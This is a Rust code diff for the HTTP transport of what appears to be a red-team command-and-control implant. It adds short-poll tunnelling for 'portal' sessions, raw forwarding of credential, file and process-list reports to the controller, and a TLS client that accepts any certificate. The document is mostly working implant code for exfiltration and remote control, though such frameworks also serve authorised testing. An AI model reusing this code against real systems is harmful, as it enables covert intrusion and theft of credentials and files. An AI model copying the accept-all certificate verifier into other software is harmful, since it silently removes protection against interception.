@@ -1,8 +1,8 @@
 use crate::Transport;
 use anyhow::{Context, Result};
 use bytes::BytesMut;
-use hyper::body::HttpBody;
-use hyper::StatusCode;
+use hyper_legacy::body::HttpBody;
+use hyper_legacy::{StatusCode, Uri};
 use pb::{c2::*, config::Config};
 use prost::Message;
 use std::sync::{
@@ -11,9 +11,9 @@ use std::sync::{
 };
 
 #[cfg(feature = "doh")]
-use crate::dns_resolver::doh::{DohProvider, HickoryResolverService};
+use crate::dns_resolver::doh::DohProvider;
 
-use hyper::Uri;
+use crate::tls_utils::legacy::AcceptAllCertVerifier;
 use std::str::FromStr;
 
 /// gRPC frame header utilities for encoding/decoding wire protocol frames
@@ -88,8 +88,8 @@ static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
-static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
-static _REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
+static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
+static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 // Marshal: Encode and encrypt a message using the ChachaCodec
 // Uses the helper functions exported from pb::xchacha
@@ -114,27 +114,35 @@ where
 trait HttpClient: Send + Sync {
     fn request(
         &self,
-        req: hyper::Request<hyper::Body>,
+        req: hyper_legacy::Request<hyper_legacy::Body>,
     ) -> std::pin::Pin<
         Box<
-            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
-                + Send
+            dyn std::future::Future<
+                    Output = Result<
+                        hyper_legacy::Response<hyper_legacy::Body>,
+                        hyper_legacy::Error,
+                    >,
+                > + Send
                 + '_,
         >,
     >;
 }
 
-impl<C> HttpClient for hyper::Client<C>
+impl<C> HttpClient for hyper_legacy::Client<C>
 where
-    C: hyper::client::connect::Connect + Clone + Send + Sync + 'static,
+    C: hyper_legacy::client::connect::Connect + Clone + Send + Sync + 'static,
 {
     fn request(
         &self,
-        req: hyper::Request<hyper::Body>,
+        req: hyper_legacy::Request<hyper_legacy::Body>,
     ) -> std::pin::Pin<
         Box<
-            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
-                + Send
+            dyn std::future::Future<
+                    Output = Result<
+                        hyper_legacy::Response<hyper_legacy::Body>,
+                        hyper_legacy::Error,
+                    >,
+                > + Send
                 + '_,
         >,
     > {
@@ -158,25 +166,180 @@ impl std::fmt::Debug for HTTP {
 }
 
 impl HTTP {
+    async fn handle_short_poll_streaming<Req, Resp>(
+        &self,
+        mut rx: tokio::sync::mpsc::Receiver<Req>,
+        tx: tokio::sync::mpsc::Sender<Resp>,
+        path: &'static str,
+    ) -> Result<()>
+    where
+        Req: Message + Send + 'static,
+        Resp: Message + Default + Send + 'static,
+    {
+        // Generate a unique session ID so the redirector can maintain a persistent
+        // gRPC stream across multiple HTTP short-poll requests.
+        let session_id = uuid::Uuid::new_v4().to_string();
+
+        loop {
+            // Buffer to hold messages to send in this polling interval
+            let mut messages = Vec::new();
+
+            // Check if there's any outgoing message (blocks until one is available or channel closed)
+            match tokio::time::timeout(std::time::Duration::from_millis(50), rx.recv()).await {
+                Ok(Some(msg)) => {
+                    messages.push(msg);
+
+                    // Grab any other immediately available messages
+                    while let Ok(msg) = rx.try_recv() {
+                        messages.push(msg);
+                    }
+                }
+                Ok(None) => {
+                    // Channel closed, terminate streaming
+                    break;
+                }
+                Err(_) => {
+                    // Timeout (50ms elapsed, no message). Continue loop to send empty payload/ping
+                }
+            }
+
+            let data_sent = !messages.is_empty();
+
+            // Prepare the body with encoded gRPC frames
+            let mut request_body = BytesMut::new();
+            for msg in messages {
+                let request_bytes = match marshal_with_codec::<Req, Resp>(msg) {
+                    Ok(bytes) => bytes,
+                    Err(err) => {
+                        #[cfg(feature = "print_debug")]
+                        log::error!("Failed to marshal streaming message: {}", err);
+                        continue;
+                    }
+                };
+                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);
+                request_body.extend_from_slice(&frame_header.encode());
+                request_body.extend_from_slice(&request_bytes);
+            }
+
+            // Build and send the HTTP request with session header for persistent stream routing
+            let uri = self.build_uri(path)?;
+            let req = self
+                .request_builder(uri)
+                .header("X-Stream-Session-Id", &session_id)
+                .body(hyper_legacy::Body::from(request_body.freeze()))
+                .context("Failed to build HTTP request")?;
+
+            let response = match tokio::time::timeout(
+                std::time::Duration::from_secs(30),
+                self.send_and_validate(req),
+            )
+            .await
+            {
+                Ok(Ok(resp)) => resp,
+                Ok(Err(err)) => {
+                    #[cfg(feature = "print_debug")]
+                    log::error!("Failed to send short poll HTTP request: {}", err);
+                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                    continue;
+                }
+                Err(_) => {
+                    #[cfg(feature = "print_debug")]
+                    log::error!("Short poll HTTP request timed out after 30s");
+                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                    continue;
+                }
+            };
+
+            // Read entire response body then decode gRPC frames and send via async channel.
+            // We cannot use stream_grpc_frames here because its handler closure is synchronous,
+            // and tokio::sync::mpsc::Sender requires async send (blocking_send panics in async context).
+            let body_bytes = Self::read_response_body(response).await;
+            let mut data_received = false;
+            let result: Result<()> = match body_bytes {
+                Ok(bytes) => {
+                    #[cfg(feature = "print_debug")]
+                    if !bytes.is_empty() {
+                        log::debug!("Received short poll response body: {} bytes", bytes.len());
+                    }
+                    let mut buffer = BytesMut::from(bytes.as_ref());
+                    let mut send_err = None;
+                    let mut frame_count = 0;
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        frame_count += 1;
+                        data_received = true;
+                        #[cfg(feature = "print_debug")]
+                        log::debug!(
+                            "Extracted frame {} from short poll response ({} bytes)",
+                            frame_count,
+                            encrypted_message.len()
+                        );
+
+                        match unmarshal_with_codec::<Req, Resp>(&encrypted_message) {
+                            Ok(response_msg) => {
+                                #[cfg(feature = "print_debug")]
+                                log::debug!("Unmarshaled message {} from short poll response, sending to channel", frame_count);
+
+                                if let Err(err) = tx.send(response_msg).await {
+                                    send_err = Some(anyhow::anyhow!(
+                                        "Failed to send response through channel: {}",
+                                        err
+                                    ));
+                                    break;
+                                }
+                            }
+                            Err(err) => {
+                                send_err = Some(err);
+                                break;
+                            }
+                        }
+                    }
+                    match send_err {
+                        Some(err) => Err(err),
+                        None => Ok(()),
+                    }
+                }
+                Err(err) => Err(err),
+            };
+
+            if let Err(err) = result {
+                #[cfg(feature = "print_debug")]
+                log::error!("Failed to process response frames: {}", err);
+                break;
+            }
+
+            // Adding a small delay to prevent tight loop spinning if rx channel isn't busy
+            if data_sent || data_received {
+                tokio::task::yield_now().await;
+            } else {
+                tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+            }
+        }
+
+        Ok(())
+    }
+
     /// Build URI from path
-    fn build_uri(&self, path: &str) -> Result<hyper::Uri> {
+    fn build_uri(&self, path: &str) -> Result<hyper_legacy::Uri> {
         let url = format!("{}{}", self.base_url, path);
         url.parse().context("Failed to parse URL")
     }
 
     /// Create a base HTTP request builder with common gRPC headers
-    fn request_builder(&self, uri: hyper::Uri) -> hyper::http::request::Builder {
-        hyper::Request::builder()
-            .method(hyper::Method::POST)
+    fn request_builder(&self, uri: hyper_legacy::Uri) -> hyper_legacy::http::request::Builder {
+        hyper_legacy::Request::builder()
+            .method(hyper_legacy::Method::POST)
             .uri(uri)
             .header("Content-Type", "application/grpc")
+            .header("Connection", "close")
     }
 
     /// Send HTTP request and validate status code
     async fn send_and_validate(
         &self,
-        req: hyper::Request<hyper::Body>,
-    ) -> Result<hyper::Response<hyper::Body>> {
+        req: hyper_legacy::Request<hyper_legacy::Body>,
+    ) -> Result<hyper_legacy::Response<hyper_legacy::Body>> {
         let response = self
             .client
             .request(req)
@@ -191,8 +354,10 @@ impl HTTP {
     }
 
     /// Read entire response body
-    async fn read_response_body(response: hyper::Response<hyper::Body>) -> Result<bytes::Bytes> {
-        hyper::body::to_bytes(response.into_body())
+    async fn read_response_body(
+        response: hyper_legacy::Response<hyper_legacy::Body>,
+    ) -> Result<bytes::Bytes> {
+        hyper_legacy::body::to_bytes(response.into_body())
             .await
             .context("Failed to read response body")
     }
@@ -211,7 +376,7 @@ impl HTTP {
         let uri = self.build_uri(path)?;
         let req = self
             .request_builder(uri)
-            .body(hyper::Body::from(request_bytes))
+            .body(hyper_legacy::Body::from(request_bytes))
             .context("Failed to build HTTP request")?;
 
         let response = self.send_and_validate(req).await?;
@@ -226,7 +391,7 @@ impl HTTP {
     /// Stream and decode gRPC frames from HTTP response body (server-streaming pattern)
     /// Generic over request/response types for unmarshaling
     async fn stream_grpc_frames<Req, Resp, F>(
-        response: hyper::Response<hyper::Body>,
+        response: hyper_legacy::Response<hyper_legacy::Body>,
         mut handler: F,
     ) -> Result<()>
     where
@@ -242,7 +407,7 @@ impl HTTP {
             while let Some((_header, encrypted_message)) =
                 grpc_frame::FrameHeader::extract_frame(&mut buffer)
             {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::debug!(
                     "Received complete encrypted message: compression={}, {} bytes",
                     _header.compression_flag,
@@ -259,7 +424,7 @@ impl HTTP {
             // Read more data from HTTP body
             match body.data().await {
                 Some(Ok(chunk)) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::debug!("Received HTTP chunk: {} bytes", chunk.len());
 
                     buffer.extend_from_slice(&chunk);
@@ -279,26 +444,26 @@ impl HTTP {
 
         // Check if there's leftover data in the buffer
         if !buffer.is_empty() {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::warn!(
                 "Incomplete data remaining in buffer: {} bytes",
                 buffer.len()
             );
         }
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!("Completed streaming messages");
 
         Ok(())
     }
 
     /// Create a streaming HTTP body that encodes requests as gRPC frames (client-streaming pattern)
-    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper::Body
+    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper_legacy::Body
     where
         Req: Message + Send + 'static,
         Resp: Message + Default + Send + 'static,
     {
-        let (mut tx, body) = hyper::Body::channel();
+        let (mut tx, body) = hyper_legacy::Body::channel();
 
         tokio::spawn(async move {
             for req_chunk in receiver {
@@ -306,7 +471,7 @@ impl HTTP {
                 let request_bytes = match marshal_with_codec::<Req, Resp>(req_chunk) {
                     Ok(bytes) => bytes,
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("Failed to marshal chunk: {}", _err);
                         return;
                     }
@@ -317,28 +482,30 @@ impl HTTP {
 
                 // Send frame header
                 if tx
-                    .send_data(hyper::body::Bytes::from(frame_header.encode().to_vec()))
+                    .send_data(hyper_legacy::body::Bytes::from(
+                        frame_header.encode().to_vec(),
+                    ))
                     .await
                     .is_err()
                 {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("Failed to send frame header for chunk");
                     return;
                 }
 
                 // Send encrypted chunk
                 if tx
-                    .send_data(hyper::body::Bytes::from(request_bytes))
+                    .send_data(hyper_legacy::body::Bytes::from(request_bytes))
                     .await
                     .is_err()
                 {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("Failed to send chunk");
                     return;
                 }
             }
 
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::debug!("Completed sending chunks");
         });
 
@@ -346,12 +513,17 @@ impl HTTP {
     }
 }
 
+#[async_trait::async_trait]
 impl Transport for HTTP {
+    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
+        Box::new(self.clone())
+    }
+
     fn init() -> Self {
-        let mut connector = hyper::client::HttpConnector::new();
+        let mut connector = hyper_legacy::client::HttpConnector::new();
         connector.enforce_http(false);
         connector.set_nodelay(true);
-        let client = hyper::Client::builder().build(connector);
+        let client = hyper_legacy::Client::builder().build(connector);
         HTTP {
             client: Arc::new(client),
             base_url: String::new(),
@@ -360,7 +532,10 @@ impl Transport for HTTP {
 
     fn new(config: Config) -> Result<Self> {
         // Extract URI and EXTRA from config using helper functions
-        let callback = crate::transport::extract_uri_from_config(&config)?;
+        let c = crate::transport::extract_uri_from_config(&config)?;
+        let callback = c
+            .replace("https1://", "https://")
+            .replace("http1://", "http://");
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
         #[cfg(feature = "doh")]
@@ -380,7 +555,7 @@ impl Transport for HTTP {
         };
 
         #[cfg(not(feature = "doh"))]
-        let mut http = hyper::client::HttpConnector::new();
+        let mut http = hyper_legacy::client::HttpConnector::new();
 
         // Get proxy configuration from extra field
         let proxy_uri = extra_map.get("http_proxy");
@@ -389,24 +564,35 @@ impl Transport for HTTP {
         http.enforce_http(false); // Allow HTTPS
         http.set_nodelay(true); // TCP optimization
 
+        let tls_config = rustls_0_21::ClientConfig::builder()
+            .with_safe_defaults()
+            .with_custom_certificate_verifier(Arc::new(AcceptAllCertVerifier))
+            .with_no_client_auth();
+
+        let https = hyper_rustls_legacy::HttpsConnectorBuilder::new()
+            .with_tls_config(tls_config)
+            .https_or_http()
+            .enable_http1()
+            .wrap_connector(http);
+
         // Build the appropriate client based on configuration
         let client: Arc<dyn HttpClient> = match proxy_uri {
             Some(proxy_uri_string) => {
                 // Create proxy connector
-                let proxy = hyper_proxy::Proxy::new(
-                    hyper_proxy::Intercept::All,
+                let proxy = hyper_proxy_legacy::Proxy::new(
+                    hyper_proxy_legacy::Intercept::All,
                     Uri::from_str(proxy_uri_string.as_str())?,
                 );
-                let mut proxy_connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;
-                proxy_connector.set_tls(None);
+                let proxy_connector =
+                    hyper_proxy_legacy::ProxyConnector::from_proxy_unsecured(https, proxy);
 
                 // Build client with proxy
-                Arc::new(hyper::Client::builder().build(proxy_connector))
+                Arc::new(hyper_legacy::Client::builder().build(proxy_connector))
             }
             #[allow(non_snake_case) /* None is a reserved keyword */]
             None => {
                 // No proxy configuration
-                Arc::new(hyper::Client::builder().build(http))
+                Arc::new(hyper_legacy::Client::builder().build(https))
             }
         };
 
@@ -425,7 +611,7 @@ impl Transport for HTTP {
         request: FetchAssetRequest,
         tx: Sender<FetchAssetResponse>,
     ) -> Result<()> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         let filename = request.name.clone();
 
         // Marshal and encrypt the request
@@ -435,7 +621,7 @@ impl Transport for HTTP {
         let uri = self.build_uri(FETCH_ASSET_PATH)?;
         let req = self
             .request_builder(uri)
-            .body(hyper::Body::from(request_bytes))
+            .body(hyper_legacy::Body::from(request_bytes))
             .context("Failed to build HTTP request")?;
 
         let response = self.send_and_validate(req).await?;
@@ -445,7 +631,7 @@ impl Transport for HTTP {
             response,
             |response_msg| {
                 tx.send(response_msg).map_err(|_err| {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!(
                         "Failed to send downloaded file chunk: {}: {}",
                         filename,
@@ -497,35 +683,35 @@ impl Transport for HTTP {
         self.unary_rpc(request, REPORT_PROCESS_LIST_PATH).await
     }
 
-    async fn report_task_output(
+    async fn report_output(
         &mut self,
-        request: ReportTaskOutputRequest,
-    ) -> Result<ReportTaskOutputResponse> {
-        self.unary_rpc(request, REPORT_TASK_OUTPUT_PATH).await
-    }
-
-    async fn reverse_shell(
-        &mut self,
-        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "http/1.1 transport does not support reverse shell"
-        ))
+        request: ReportOutputRequest,
+    ) -> Result<ReportOutputResponse> {
+        self.unary_rpc(request, REPORT_OUTPUT_PATH).await
     }
 
     async fn create_portal(
         &mut self,
-        _rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
-        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
+        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
+        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
     ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "http/1.1 transport does not support portal"
-        ))
+        // Spawn polling loop in background and return immediately,
+        // matching the gRPC transport behavior.
+        let transport = self.clone();
+        tokio::spawn(async move {
+            if let Err(_err) = transport
+                .handle_short_poll_streaming(rx, tx, CREATE_PORTAL_PATH)
+                .await
+            {
+                #[cfg(feature = "print_debug")]
+                log::error!("create_portal short poll streaming ended: {}", _err);
+            }
+        });
+        Ok(())
     }
 
     fn get_type(&mut self) -> pb::c2::transport::Type {
-        return pb::c2::transport::Type::TransportHttp1;
+        pb::c2::transport::Type::TransportHttp1
     }
 
     fn is_active(&self) -> bool {
@@ -534,6 +720,170 @@ impl Transport for HTTP {
 
     fn name(&self) -> &'static str {
         "http"
+    }
+
+    async fn forward_raw(
+        &mut self,
+        path: String,
+        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> anyhow::Result<()> {
+        let uri = self.build_uri(&path)?;
+        let parts: Vec<&str> = path.split('/').collect();
+        let method_name = *parts.get(2).unwrap_or(&"");
+
+        match method_name {
+            "ClaimTasks" | "ReportCredential" | "ReportProcessList" | "ReportOutput" => {
+                let req_bytes = rx
+                    .recv()
+                    .await
+                    .ok_or_else(|| anyhow::anyhow!("No input for unary call"))?;
+                let req = self
+                    .request_builder(uri)
+                    .body(hyper_legacy::Body::from(req_bytes))
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let body_bytes = Self::read_response_body(response).await?;
+                tx.send(body_bytes.to_vec())
+                    .await
+                    .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
+            }
+            "FetchAsset" => {
+                let req_bytes = rx
+                    .recv()
+                    .await
+                    .ok_or_else(|| anyhow::anyhow!("No input for FetchAsset"))?;
+                let req = self
+                    .request_builder(uri)
+                    .body(hyper_legacy::Body::from(req_bytes))
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let mut body = response.into_body();
+                let mut buffer = BytesMut::new();
+
+                loop {
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        let chunk = encrypted_message.to_vec();
+                        tx.send(chunk)
+                            .await
+                            .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
+                    }
+
+                    match body.data().await {
+                        Some(Ok(chunk)) => {
+                            buffer.extend_from_slice(&chunk);
+                        }
+                        Some(Err(err)) => {
+                            return Err(anyhow::anyhow!("Failed to read chunk: {}", err))
+                        }
+                        None => break,
+                    }
+                }
+            }
+            "ReportFile" => {
+                let (mut req_tx, body) = hyper_legacy::Body::channel();
+
+                tokio::spawn(async move {
+                    while let Some(req_chunk) = rx.recv().await {
+                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(
+                                frame_header.encode().to_vec(),
+                            ))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(req_chunk))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                    }
+                });
+
+                let req = self
+                    .request_builder(uri)
+                    .body(body)
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let body_bytes = Self::read_response_body(response).await?;
+                tx.send(body_bytes.to_vec())
+                    .await
+                    .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
+            }
+            "CreatePortal" => {
+                let (mut req_tx, body) = hyper_legacy::Body::channel();
+
+                tokio::spawn(async move {
+                    while let Some(req_chunk) = rx.recv().await {
+                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(
+                                frame_header.encode().to_vec(),
+                            ))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(req_chunk))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                    }
+                });
+
+                let req = self
+                    .request_builder(uri)
+                    .body(body)
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let mut body = response.into_body();
+                let mut buffer = BytesMut::new();
+
+                loop {
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        let chunk = encrypted_message.to_vec();
+                        if tx.send(chunk).await.is_err() {
+                            // Forwarding channel closed, we can break out of sending
+                            break;
+                        }
+                    }
+
+                    match body.data().await {
+                        Some(Ok(chunk)) => {
+                            buffer.extend_from_slice(&chunk);
+                        }
+                        Some(Err(err)) => {
+                            return Err(anyhow::anyhow!("Failed to read chunk: {}", err))
+                        }
+                        None => break,
+                    }
+                }
+            }
+            _ => {
+                return Err(anyhow::anyhow!(
+                    "Unsupported HTTP method for raw forwarding: {}",
+                    method_name
+                ));
+            }
+        }
+        Ok(())
     }
 
     fn list_available(&self) -> Vec<String> {
@@ -713,7 +1063,7 @@ mod tests {
         #[test]
         fn test_build_uri_success() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -724,7 +1074,7 @@ mod tests {
         #[test]
         fn test_build_uri_with_trailing_slash() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost:8080/".to_string(),
             };
 
@@ -735,7 +1085,7 @@ mod tests {
         #[test]
         fn test_build_uri_without_leading_slash() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -746,7 +1096,7 @@ mod tests {
         #[test]
         fn test_build_uri_invalid() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "not a valid url".to_string(),
             };
 
@@ -757,17 +1107,17 @@ mod tests {
         #[test]
         fn test_request_builder_headers_and_method() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost".to_string(),
             };
 
             let uri = http.build_uri("/test").unwrap();
             let request = http
                 .request_builder(uri)
-                .body(hyper::Body::empty())
+                .body(hyper_legacy::Body::empty())
                 .unwrap();
 
-            assert_eq!(request.method(), hyper::Method::POST);
+            assert_eq!(request.method(), hyper_legacy::Method::POST);
             assert_eq!(
                 request.headers().get("content-type").unwrap(),
                 "application/grpc"
@@ -777,14 +1127,14 @@ mod tests {
         #[test]
         fn test_request_builder_uri() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://example.com".to_string(),
             };
 
             let uri = http.build_uri("/api/test").unwrap();
             let request = http
                 .request_builder(uri.clone())
-                .body(hyper::Body::empty())
+                .body(hyper_legacy::Body::empty())
                 .unwrap();
 
             assert_eq!(request.uri(), &uri);
